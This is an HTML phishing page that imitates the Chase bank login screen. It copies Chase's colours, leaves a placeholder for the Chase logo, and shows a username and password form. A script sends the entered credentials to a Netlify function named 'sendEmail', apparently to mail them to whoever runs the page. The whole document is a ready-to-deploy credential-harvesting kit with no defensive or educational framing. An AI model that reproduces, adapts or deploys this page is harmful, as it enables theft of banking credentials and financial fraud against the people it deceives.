<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Chase Login</title>
<style>
body {
font-family: Arial, sans-serif;
background-color: #0033a0; /* Chase blue */
color: #fff;
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
margin: 0;
}

.container {
background: #fff;
color: #000;
padding: 40px;
border-radius: 10px;
width: 360px;
box-shadow: 0 4px 15px rgba(0,0,0,0.3);
text-align: center;
}

.logo {
width: 120px;
margin-bottom: 20px;
}

input {
display: block;
width: 100%;
padding: 12px;
margin: 10px 0;
border-radius: 5px;
border: 1px solid #ccc;
font-size: 16px;
}

button {
width: 100%;
padding: 12px;
background-color: #0072ce;
color: #fff;
border: none;
border-radius: 5px;
font-size: 16px;
cursor: pointer;
}

button:hover {
background-color: #005ea6;
}

#result {
margin-top: 15px;
font-weight: bold;
}
</style>
</head>
<body>
<div class="container">
<img class="logo" src="YOUR_LOGO_URL_HERE" alt="Chase Logo">
<form id="loginForm">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div id="result"></div>
</div>

<script>
const form = document.getElementById('loginForm');
const resultDiv = document.getElementById('result');

form.addEventListener('submit', async (e) => {
e.preventDefault();
const username = e.target.username.value;
const password = e.target.password.value;

try {
const res = await fetch('/.netlify/functions/sendEmail', {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ username, password })
});

const data = await res.json();
resultDiv.innerText = data.message;
resultDiv.style.color = res.status === 200 ? 'green' : 'red';
} catch (err) {
resultDiv.innerText = 'Network error';
resultDiv.style.color = 'red';
}
});
</script>
</body>
</html>
